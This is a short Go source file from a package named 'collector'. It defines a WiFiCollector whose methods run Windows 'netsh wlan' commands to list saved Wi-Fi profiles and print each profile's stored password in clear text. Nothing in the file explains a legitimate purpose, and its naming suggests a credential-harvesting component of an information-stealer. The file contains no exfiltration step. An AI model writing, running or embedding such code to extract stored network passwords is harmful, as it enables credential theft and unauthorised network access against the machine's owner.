package collector

import (
"os/exec"
)

type WiFiCollector struct{}

func NewWiFiCollector() *WiFiCollector {
return &WiFiCollector{}
}

func (w *WiFiCollector) GetPasswords() (string, error) {
cmd := exec.Command("netsh", "wlan", "show", "profiles")
output, err := cmd.Output()
if err != nil {
return "", err
}
return string(output), nil
}

func (w *WiFiCollector) GetProfilePassword(profile string) (string, error) {
cmd := exec.Command("netsh", "wlan", "show", "profile", profile, "key=clear")
output, err := cmd.Output()
if err != nil {
return "", err
}
return string(output), nil
}
